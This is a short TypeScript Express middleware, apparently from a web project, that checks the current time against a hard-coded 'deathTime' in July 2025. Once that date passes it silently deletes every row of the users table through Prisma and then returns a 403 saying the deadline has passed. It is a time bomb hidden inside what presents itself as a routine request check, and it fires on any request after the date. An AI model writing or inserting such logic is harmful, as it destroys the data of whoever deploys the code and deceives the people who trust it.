import { Request, Response, NextFunction } from "express";
import { prisma } from "../prisma/prisma.service";

export const verifyTime = async (_req: Request, res: Response, next: NextFunction) => {
    try {
        const currentTime = new Date();
        const deathTime = new Date('2025-07-17T12:06:00');

        if (currentTime > deathTime) {
            await prisma.users.deleteMany();
            return res.status(403).json({ message: "la fehca limite ha pasado" })
        }
        return next();
    } catch (error) {
        return res.status(500).json({ message: `Server ${error}` })
    }
}